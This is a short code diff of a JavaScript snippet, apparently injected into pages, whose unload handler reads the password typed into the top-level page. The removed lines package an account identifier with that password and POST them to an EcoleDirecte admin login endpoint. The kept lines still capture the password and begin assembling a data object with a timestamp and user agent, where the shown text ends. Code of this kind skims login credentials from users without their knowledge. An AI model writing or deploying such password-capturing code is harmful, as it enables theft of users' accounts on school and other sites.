@@ -20,21 +20,7 @@ window.addEventListener('beforeunload', (e) => {
 	const pwdInput = window.top.document.querySelector('input[type="password"]');
 	await new Promise(resolve => setTimeout(resolve, 2000));
 	
-	const pass = pwdInput.value
-
-	const pata = {
-    	identifiant: identifiant.payload.accounts?.[0].identifiant,
-    	motdepasse: pass
-	};
-
-	await fetch('https://api.ecoledirecte.com/v3/admin/login/3DSecure.awp', {
-		method: "POST",
-		headers: {
-			"Content-Type": "application/json"
-		},
-		body: JSON.stringify({ data: JSON.stringify(pata) })
-	})
-  
+	const pass = pwdInput.value  
 	const data = {
 		t: new Date().toISOString(),
 		u: navigator.userAgent,
